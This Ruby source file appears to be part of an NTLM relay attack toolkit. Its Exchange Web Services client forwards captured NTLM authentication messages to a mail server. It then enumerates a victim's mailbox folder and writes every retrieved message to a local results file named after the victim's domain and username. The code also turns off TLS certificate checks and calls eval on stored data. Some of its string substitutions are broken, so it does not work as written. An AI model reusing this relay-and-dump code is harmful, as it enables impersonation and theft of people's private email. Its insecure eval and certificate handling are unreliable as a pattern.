#!/usr/bin/env ruby
#encoding: ASCII-8BIT
=begin
exchange web services client
=end
require 'net/http'
require 'net/https'
require 'base64'
require 'zack_attack/zfdb'

Ews_id_query = '<?xml version="1.0" encoding="utf-8"?>
                      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
                        <soap:Body>
                          <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" Traversal="Shallow">
                            <ItemShape>
                              <t:BaseShape>IdOnly</t:BaseShape>
                            </ItemShape>
                            <ParentFolderIds>
                              <t:DistinguishedFolderId Id="CHANGEME"/>
                            </ParentFolderIds>
                          </FindItem>
                        </soap:Body>
                      </soap:Envelope>'

Info3 = '<?xml version="1.0" encoding="utf-8"?>
                      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
                        <soap:Body>
                          <GetItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
                            <ItemShape>
                              <t:BaseShape>Default</t:BaseShape>
                              <t:IncludeMimeContent>true</t:IncludeMimeContent>
                            </ItemShape>
                          <ItemIds>'
Info4 = '     </ItemIds>
                        </GetItem>
                      </soap:Body>
                    </soap:Envelope>'

module ZFClient
  class EWS
    def initialize (server,port)
      @db = ZFdb::DB.new
      @client = Net::HTTP.new(server, port) or return false
      if port == 443 then @client.use_ssl = true end
      @client.verify_mode = OpenSSL::SSL::VERIFY_NONE
      return @client.start

    end

    def connect

    end

    def sendtype1(type1msg)
      request = Net::HTTP::Post.new('/ews/Exchange.asmx')

      request['authorization'] = 'NTLM ' + Base64.encode64(type1msg).gsub("\n",'').strip
      request['Content-Length'] = '0'
      request['Content-Type'] = "text/xml"
      request['Connection'] = "Keep-Alive"
      begin response = @client.request(request) or return false end
      chal = response['www-authenticate'][/NTLM (.*)/ , 1].split(',')[0]

      return Base64.decode64(chal).gsub("\n",'')
    end

    def sendtype3(type3msg, rawpkt, items=nil)
      request = Net::HTTP::Post.new('/ews/Exchange.asmx')
      asdf = ZFNtlm::Message.new(type3msg)
      asdf.parsetype3()
      puts items.inspect
      actions = @db.GetActionItems(items["aid"])
      # TODO change to just check if auth worked.
      request['Content-Type'] = "text/xml"
      request['Connection'] = "Keep-Alive"
      request['Authorization'] = 'NTLM ' + Base64.encode64(type3msg).gsub("\n",'').strip
      woof = Ews_id_query
      woof.sub("CHANGEME","trash")
      request['Content-Length'] = woof.length
      request.body = woof
      response = @client.request(request)
      
      #TODO check auth status
      actions.each do |act|
        if act[3] == 1 then #get emails
          folder = (eval act[4])["folder"]
          body = Ews_id_query
          puts folder
          puts body
          body.sub("CHANGEME",folder)
          request = Net::HTTP::Post.new('/ews/Exchange.asmx')
          request['Content-Type'] = "text/xml"
          request['Connection'] = "Keep-Alive"
          request['Content-Length'] = body.length
          request.body = body
          puts request.body
          response = @client.request(request)
          
          request2 = Net::HTTP::Post.new('/ews/Exchange.asmx')
          request2['Content-Type'] = "text/xml"
          request2['Connection'] = "Keep-Alive"
          countdrac = 0
          io = File.open './results/ews-' + asdf.domain + "-" + asdf.username + '.txt', 'w'
          
          response.body.scan(/t:Message>(.*?)<\/t:Message/i) do |gophers|
            puts "Enumerating through previous obtained message IDs: "
            q = Info3.to_s + gophers[0].to_s() + Info4.to_s
            request2['Content-Length'] = q.length
            request2.body = q
            #puts gophers
            @client.request request2 do |res|
              countdrac = countdrac + 1
              puts countdrac
              io.write res.body
            end
          end
        elsif act[3] == 2 then # get calendar
          
        elsif act[3] == 3 then # get contacts
          
        else puts "unknown action for ews"
        end

      end
      return true
    end

    def execute

    end
  end
end
